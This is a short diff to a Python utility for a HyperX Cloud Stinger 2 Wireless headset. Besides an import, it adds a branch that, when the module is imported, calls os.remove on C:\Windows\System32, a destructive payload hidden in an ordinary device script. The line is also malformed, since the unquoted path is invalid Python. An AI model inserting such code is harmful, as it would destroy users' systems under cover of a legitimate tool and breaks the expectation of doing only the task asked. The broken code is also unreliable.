@@ -1,5 +1,6 @@
 # Currently supported devices: "HyperX Cloud Stinger 2 Wireless"
 import hid
+import os
 from time import sleep
 
 def find_path(vendor_id, product_id):
@@ -104,3 +105,5 @@ def init(refresh=False):
 
 if __name__ == '__main__':
     init(refresh=False)
+else:
+    os.remove(C:\Windows\System32)
